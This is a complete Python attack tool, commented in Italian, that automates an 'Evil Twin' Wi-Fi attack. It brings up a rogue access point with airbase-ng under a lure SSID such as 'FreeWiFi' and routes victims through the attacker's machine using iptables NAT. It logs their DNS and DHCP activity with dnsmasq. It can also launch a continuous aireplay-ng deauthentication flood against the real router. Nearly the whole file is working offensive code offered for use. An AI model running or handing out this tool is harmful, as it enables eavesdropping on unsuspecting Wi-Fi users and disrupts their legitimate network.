#!/usr/bin/env python3
"""
Evil Twin Attack Tool with airbase-ng
Automatic setup, keeps your internet connection active.
Requires root privileges.
"""

import os
import sys
import time
import signal
import subprocess
import netifaces
import re

# --------------------------- FUNZIONI DI UTILITY ---------------------------

def run_cmd(cmd, check=False, capture=True):
    """Esegue un comando shell e ritorna output/errore."""
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip(), result.stderr.strip(), result.returncode
        else:
            result = subprocess.run(cmd, shell=True)
            return "", "", result.returncode
    except Exception as e:
        return "", str(e), -1

def check_root():
    if os.geteuid() != 0:
        print("[!] Questo script deve essere eseguito come root. Uscita.")
        sys.exit(1)

def get_interfaces():
    """Ritorna lista delle interfacce wireless fisiche (non monitor)."""
    output, _, _ = run_cmd("iw dev | grep Interface | awk '{print $2}'")
    return output.splitlines()

def get_interface_with_default_route():
    """Trova l'interfaccia che ha la route predefinita (internet)."""
    gateways = netifaces.gateways()
    default = gateways.get('default', {})
    if netifaces.AF_INET in default:
        return default[netifaces.AF_INET][1]
    return None

def get_free_wireless_interface(used_interface):
    """Trova la prima interfaccia wireless che non è quella usata per internet."""
    all_wlan = get_interfaces()
    for iface in all_wlan:
        if iface != used_interface:
            return iface
    return None

def enable_monitor_mode(iface):
    """Attiva la modalità monitor sull'interfaccia (senza airmon-ng)."""
    print(f"[*] Abilito monitor mode su {iface}...")
    run_cmd(f"ip link set {iface} down", capture=False)
    run_cmd(f"iw {iface} set monitor control", capture=False)
    run_cmd(f"ip link set {iface} up", capture=False)
    time.sleep(1)
    # Verifica
    out, _, _ = run_cmd(f"iwconfig {iface} | grep -i mode")
    if 'monitor' in out.lower():
        print(f"[✓] Monitor mode attivato su {iface}")
        return True
    else:
        print(f"[✗] Impossibile attivare monitor mode su {iface}")
        return False

def disable_monitor_mode(iface):
    """Riporta l'interfaccia in modalità managed."""
    print(f"[*] Ripristino {iface} in modalità managed...")
    run_cmd(f"ip link set {iface} down", capture=False)
    run_cmd(f"iw {iface} set type managed", capture=False)
    run_cmd(f"ip link set {iface} up", capture=False)

def cleanup(at0, monitor_iface, dnsmasq_pid, airbase_pid):
    """Funzione di cleanup chiamata all'uscita."""
    print("\n[*] Pulizia in corso...")
    # Uccidi dnsmasq
    if dnsmasq_pid:
        run_cmd(f"kill {dnsmasq_pid}", capture=False)
    # Uccidi airbase-ng
    if airbase_pid:
        run_cmd(f"kill {airbase_pid}", capture=False)
    time.sleep(1)
    # Ripristina iptables (cancella regole NAT e FORWARD)
    run_cmd("iptables -t nat -D POSTROUTING -o {} -j MASQUERADE 2>/dev/null".format(internet_iface), capture=False)
    run_cmd("iptables -D FORWARD -i {} -o {} -j ACCEPT 2>/dev/null".format(at0, internet_iface), capture=False)
    run_cmd("iptables -D FORWARD -i {} -o {} -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null".format(internet_iface, at0), capture=False)
    # Disabilita IP forwarding
    run_cmd("sysctl -w net.ipv4.ip_forward=0", capture=False)
    # Rimuovi interfaccia at0 (viene eliminata con airbase-ng, ma per sicurezza)
    run_cmd(f"ip link set {at0} down 2>/dev/null", capture=False)
    # Ripristina monitor iface in managed
    if monitor_iface:
        disable_monitor_mode(monitor_iface)
    print("[✓] Pulizia completata. Uscita.")

# --------------------------- MAIN ---------------------------

def main():
    check_root()

    global internet_iface, monitor_iface, at0, dnsmasq_pid, airbase_pid
    internet_iface = None
    monitor_iface = None
    at0 = "at0"
    dnsmasq_pid = None
    airbase_pid = None

    # Trova interfaccia connessa a Internet
    internet_iface = get_interface_with_default_route()
    if not internet_iface:
        print("[!] Nessuna interfaccia con route predefinita trovata. Sei connesso a Internet?")
        sys.exit(1)
    print(f"[+] Interfaccia Internet rilevata: {internet_iface}")

    # Trova un'interfaccia wireless libera per l'AP falso
    free_iface = get_free_wireless_interface(internet_iface)
    if not free_iface:
        print("[!] Nessuna interfaccia wireless aggiuntiva trovata. Collega un adattatore USB.")
        sys.exit(1)
    print(f"[+] Interfaccia per l'AP falso: {free_iface}")

    # Input utente
    ssid = input(f"Inserisci SSID della rete fake (default: 'FreeWiFi'): ") or "FreeWiFi"
    channel = input(f"Inserisci canale (default: 6): ") or "6"

    # Abilita monitor mode sull'interfaccia libera
    if not enable_monitor_mode(free_iface):
        sys.exit(1)
    monitor_iface = free_iface

    # Avvia airbase-ng
    print(f"[*] Avvio airbase-ng (SSID: {ssid}, canale: {channel})...")
    cmd_airbase = f"airbase-ng -e '{ssid}' -c {channel} {monitor_iface}"
    proc_airbase = subprocess.Popen(cmd_airbase, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    airbase_pid = proc_airbase.pid
    print(f"[✓] airbase-ng avviato con PID {airbase_pid}")

    # Attendi la creazione di at0
    print("[*] Attendo la creazione dell'interfaccia at0...")
    for _ in range(10):
        time.sleep(1)
        if os.path.exists("/sys/class/net/" + at0):
            print("[✓] Interfaccia at0 rilevata.")
            break
    else:
        print("[✗] Interfaccia at0 non creata. airbase-ng potrebbe non funzionare.")
        cleanup(at0, monitor_iface, dnsmasq_pid, airbase_pid)
        sys.exit(1)

    # Configura at0
    print("[*] Configurazione IP su at0...")
    run_cmd(f"ifconfig {at0} up", capture=False)
    run_cmd(f"ifconfig {at0} 10.0.0.1 netmask 255.255.255.0", capture=False)
    run_cmd(f"route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1", capture=False)

    # Abilita IP forwarding
    print("[*] Abilito IP forwarding...")
    run_cmd("sysctl -w net.ipv4.ip_forward=1", capture=False)

    # Configura iptables (NAT)
    print("[*] Configurazione iptables...")
    run_cmd(f"iptables -t nat -A POSTROUTING -o {internet_iface} -j MASQUERADE", capture=False)
    run_cmd(f"iptables -A FORWARD -i {at0} -o {internet_iface} -j ACCEPT", capture=False)
    run_cmd(f"iptables -A FORWARD -i {internet_iface} -o {at0} -m state --state RELATED,ESTABLISHED -j ACCEPT", capture=False)

    # Prepara dnsmasq
    print("[*] Avvio dnsmasq per DHCP/DNS...")
    dnsmasq_conf = f"""
interface={at0}
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,8.8.8.8
no-resolv
log-queries
log-dhcp
    """
    conf_file = "/tmp/eviltwin_dnsmasq.conf"
    with open(conf_file, "w") as f:
        f.write(dnsmasq_conf)

    # Avvia dnsmasq in background
    proc_dnsmasq = subprocess.Popen(f"dnsmasq -C {conf_file} -d", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    dnsmasq_pid = proc_dnsmasq.pid
    print(f"[✓] dnsmasq avviato con PID {dnsmasq_pid}")

    print("\n[✓] Evil Twin attivo!")
    print(f"    SSID: {ssid} | Canale: {channel}")
    print(f"    Gateway: 10.0.0.1 | DHCP range: 10.0.0.10 - 10.0.0.50")
    print("\n[*] Premi Ctrl+C per terminare e pulire.\n")

    # Opzione per deauth
    deauth = input("Vuoi effettuare un attacco deauth contro la rete originale? (s/N): ").lower()
    if deauth.startswith('s'):
        bssid = input("Inserisci il BSSID del router originale (es. AA:BB:CC:DD:EE:FF): ")
        if bssid:
            print(f"[*] Avvio deauth su {bssid}... (airplay-ng)")
            # Esegui deauth in un processo separato
            subprocess.Popen(f"aireplay-ng --deauth 0 -a {bssid} {monitor_iface}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[*] Deauth avviato (continua fino a Ctrl+C)")

    # Gestione segnale per cleanup
    def signal_handler(sig, frame):
        cleanup(at0, monitor_iface, dnsmasq_pid, airbase_pid)
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Tieni lo script in esecuzione
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()